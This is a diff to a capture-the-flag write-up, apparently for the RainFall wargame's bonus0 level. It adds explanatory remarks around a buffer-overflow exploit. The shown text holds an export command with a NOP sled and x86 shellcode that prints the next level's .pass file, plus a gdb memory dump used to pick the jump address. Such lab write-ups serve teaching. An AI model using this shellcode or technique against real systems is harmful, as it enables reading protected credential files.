@@ -21,7 +21,7 @@ Program received signal SIGSEGV, Segmentation fault.
 
 So we just need to put a shellcode that will print us the `/home/user/bonus1/.pass` in an environment variable as done previously and give the address to this variable and it will print the flag :
 
-So first we export our shellcode :
+So first we export our shellcode. This shellcode is different : it doesn't run a shell, but it outputs the content of a file's given path (found here: http://shell-storm.org/shellcode/files/shellcode-73.php) :
 
 ```bash
 bonus0@RainFall:~$ export SHELLCODE=`python -c 'print("\x90" * 30 + "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/user/bonus1/.pass")'`
@@ -47,7 +47,7 @@ Breakpoint 1, 0x080485a7 in main ()
 0xbffff802:	0x90909090	0x90909090	0x90909090	0x90909090
 ```
 
-Here `0xbfff802`.
+Here `0xbfff802`. [Warning : This address may change, so we will have to update the shellcode below to fit our needs]
 And then we feed the two desired inputs like so :
 
 ```bash
